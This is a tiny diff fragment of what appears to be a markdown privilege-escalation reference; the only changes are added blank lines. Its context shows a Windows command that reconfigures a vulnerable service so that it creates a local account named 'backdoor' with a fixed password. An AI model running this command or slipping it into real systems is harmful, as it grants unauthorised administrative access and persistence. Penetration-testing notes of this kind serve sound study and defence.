@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:37:52.272360+00:00'
 ```bash
 $ sc config <vuln-service> binpath="net user backdoor backdoor123 /add"
 ```
+
+
